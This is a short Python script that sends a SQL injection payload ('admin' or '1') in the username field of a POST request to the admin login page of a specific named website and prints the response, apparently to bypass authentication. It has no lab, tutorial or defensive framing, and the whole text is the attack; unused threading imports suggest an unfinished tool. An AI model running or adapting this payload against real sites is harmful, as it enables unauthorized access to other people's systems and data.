import requests
import random
import _thread
import threading
url="http://www.qlrs-vip.cn/admin/login.php"
print(requests.post(url,data={'user':"admin' or '1",'pass':'a','login':''}).text)